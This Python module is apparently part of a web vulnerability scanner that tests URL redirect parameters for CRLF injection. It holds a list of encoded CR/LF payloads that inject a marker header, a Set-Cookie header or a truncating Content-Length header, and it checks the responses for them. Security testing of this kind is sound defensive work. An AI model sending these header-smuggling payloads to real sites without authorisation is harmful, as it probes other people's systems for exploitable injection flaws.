"""
modules/crlf_injection.py — CRLF Injection / HTTP Response Splitting
Injects \\r\\n sequences into URL params and headers to detect header injection.
"""
from core.http import fetch

CRLF_MARKER = "X-CRLF-Injected"
CRLF_VALUE  = "apex-crlf-test"

CRLF_PAYLOADS = [
    f"\r\n{CRLF_MARKER}: {CRLF_VALUE}",
    f"\r\n{CRLF_MARKER}:%20{CRLF_VALUE}",
    f"%0d%0a{CRLF_MARKER}:%20{CRLF_VALUE}",
    f"%0D%0A{CRLF_MARKER}:%20{CRLF_VALUE}",
    f"%0d%0a{CRLF_MARKER}: {CRLF_VALUE}",
    f"\n{CRLF_MARKER}: {CRLF_VALUE}",
    f"%0a{CRLF_MARKER}:%20{CRLF_VALUE}",
    f"\\r\\n{CRLF_MARKER}: {CRLF_VALUE}",
    f"\\n{CRLF_MARKER}: {CRLF_VALUE}",
    f"\r\nSet-Cookie: crlf=injected; Path=/",
    f"%0d%0aSet-Cookie: crlf=injected; Path=/",
    f"%0d%0aContent-Length: 0%0d%0a%0d%0a",
]

CRLF_PARAMS = ["url", "next", "redirect", "return", "dest", "destination", "continue",
               "r", "to", "out", "location", "cb", "path", "ref", "redir"]


def generate_tasks(url, config):
    tasks = []
    for param in CRLF_PARAMS:
        for payload in CRLF_PAYLOADS:
            tasks.append({
                "url": url,
                "method": "GET",
                "params": {param: f"https://example.com{payload}"},
                "type": "CRLF Injection",
                "crlf_param": param,
                "executor": test_crlf,
            })
    return tasks


async def test_crlf(session, task):
    try:
        text, resp = await fetch(session, task["url"], params=task["params"], allow_redirects=False)
        if not resp:
            return {"type": "CRLF Injection", "url": task["url"], "vulnerable": False}

        # Check if injected header appears in response headers
        headers_lower = {k.lower(): v for k, v in resp.headers.items()}
        injected = CRLF_MARKER.lower() in headers_lower or \
                   CRLF_VALUE in " ".join(resp.headers.values()) or \
                   "crlf=injected" in headers_lower.get("set-cookie", "") or \
                   (text and CRLF_MARKER in text)

        return {
            "type": "CRLF Injection",
            "url": task["url"],
            "params": task["params"],
            "vulnerable": injected,
            "severity": "High" if injected else "Info",
            "response_headers": dict(resp.headers) if injected else {},
            "owasp_category": "A03:2021 – Injection",
        }
    except Exception as exc:
        return {"type": "CRLF Injection", "url": task["url"], "error": str(exc), "vulnerable": False}
